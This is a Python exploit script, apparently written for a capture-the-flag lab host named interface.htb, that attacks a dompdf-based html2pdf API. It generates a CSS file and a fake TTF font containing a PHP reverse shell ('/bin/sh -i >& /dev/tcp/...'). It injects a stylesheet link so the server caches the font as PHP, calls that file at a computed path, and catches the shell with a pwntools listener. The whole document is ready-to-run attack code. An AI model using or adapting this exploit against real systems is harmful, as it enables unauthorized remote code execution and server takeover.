#!/usr/bin/python3

import requests
from time import sleep
import sys
import threading
from pwn import *
import http.server
import json
import hashlib

"""
Provide this script with an ip and port for an HTTP server that will serve 2 files.
A .css file and a .php file which will be requested by the .css file. The .php file is a .ttf file with an added reverse shell
code at the end and file extenions was changed to .php.
Once both files are retrieved, and a reverse shell listener on the local port+1 is started, a call to the uploaded php file is made at a known location
on the web server and a reverse shell should be established.
FYI, this script generates the .css and .php file on its own. It does not delete the files when done.

GL.
"""

if len(sys.argv) < 3:
    print("Missing parameters, local ip and port for HTTP server")
    exit()

css_file_name = "DejaVuSerif.css"
font_file_name = "DejaVuSerif.php"
font_name = "DejaVuSerif"
local_ip = sys.argv[1]
local_port = sys.argv[2]

css_payload = """@font-face {{
    font-family:{name};
    src:url('http://{ip}:{port}/{file_name}');
    font-weight:'normal';
    font-style:'normal';
  }}""".format(name=font_name, ip=local_ip, port=local_port, file_name=font_file_name)


class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def handle_request(self):
        success(f"Received request for {self.path}")
        return super().handle_request()
        

class MyHttpServerThread(threading.Thread):
    def __init__(self, port):
        super().__init__()
        self.port = port
    
    def run(self):
        Handler = MyHttpRequestHandler
        with http.server.HTTPServer(("", int(self.port)), Handler) as httpd:
            print("Serving at port", self.port)
            httpd.serve_forever()

def create_css_file():
    success("Attempting to create css payload")
    sleep(1)
    with open(css_file_name, "w") as f:
        f.write(css_payload)
        success("Wrote css payload")


def create_font_and_modify():
    success("Modifying a font with reverse shell...")
    sleep(1)
    with open(font_file_name, 'wb') as f:
        header = b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5F\x50\x47\x46\x00\x01\x00\x00\x50\x01"
        f.write(header)

        loc_p = int(local_port)
        content = f'''\n<?php system("bash -c '/bin/sh -i >& /dev/tcp/{local_ip}/{loc_p + 1} 0>&1'"); ?>'''
        f.write(content.encode())
        success("Font created and modified successfully")
    

def inject_xss():
    success("Staging payload via xss")
    sleep(1)

    url = "http://prd.m.rendering-api.interface.htb/api/html2pdf"
    data = {"html":f"<link rel=stylesheet href='http://{local_ip}:{local_port}/{css_file_name}'>"}


    success(f"Sending: {data}")
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, data=json.dumps(data), headers=headers)

    if response.status_code == 200:
        success("Staging payload successful")
    else:
        log.failure(f"Failed to inject via xss {response.text}")


def execute_payload_remotely():
    success("Calling remote injection")
    sleep(1)

    
    md5 = hashlib.md5(f"http://{local_ip}:{local_port}/{font_file_name}".encode()).hexdigest()
    file_name = f"{font_name}_normal_{md5}.php"
    url = f"http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/{file_name.lower()}"
    success(f"Activating payload: {url}")
    sleep(1)
    response = requests.get(url)

    if response.status_code == 200:
        success("Enjoy your shell")
    else:
        log.failure(f"Calling remote payload failed {response.text}")

    
def initiate_http_server():
    success("Starting an HTTP server")
    sleep(1)
    http_server = MyHttpServerThread(local_port)
    http_server.start()    


def initiate_call_back():
    success("Starting reverse shell listener")
    sleep(1)
    loc_p = int(local_port)
    l = listen(loc_p+1)
    conn = l.wait_for_connection()
    conn.interactive()

def start_callback_server():
    t = threading.Thread(target=initiate_call_back)
    t.start()


create_css_file()
create_font_and_modify()
initiate_http_server()
start_callback_server()
inject_xss()
execute_payload_remotely()